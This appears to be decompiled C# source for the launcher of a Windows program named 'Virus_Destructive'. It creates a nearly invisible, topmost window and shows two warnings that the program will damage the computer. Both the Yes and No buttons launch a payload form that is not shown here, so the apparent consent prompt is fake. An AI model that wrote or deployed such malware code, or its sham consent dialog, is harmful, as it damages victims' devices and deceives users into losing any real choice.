using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Virus_Destructive;

public class Virus : Form
{
	private IContainer components = null;

	public Virus()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
		((Form)this).set_TopMost(true);
	}

	private void Virus_Load(object sender, EventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show("Are you sure you want to run this program? This program may harm your device. Click Yes to continue", "WARNING", (MessageBoxButtons)4, (MessageBoxIcon)48, (MessageBoxDefaultButton)256) == 7)
		{
			go_to_payload();
		}
		else
		{
			go_to_payload();
		}
	}

	public void Last_Warning()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show("THIS IS THE LAST WARNING!!! IF YOU RUN THIS PROGRAM, YOUR COMPUTER GET A LOT OF DAMAGE!!!", "WARNING", (MessageBoxButtons)4, (MessageBoxIcon)48, (MessageBoxDefaultButton)256) == 7)
		{
			go_to_payload();
		}
		else
		{
			go_to_payload();
		}
	}

	public void go_to_payload()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).Hide();
		Virus_payload virus_payload = new Virus_payload();
		((Form)virus_payload).ShowDialog();
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Virus));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Virus");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Virus");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Virus_Load);
		((Control)this).ResumeLayout(false);
	}
}
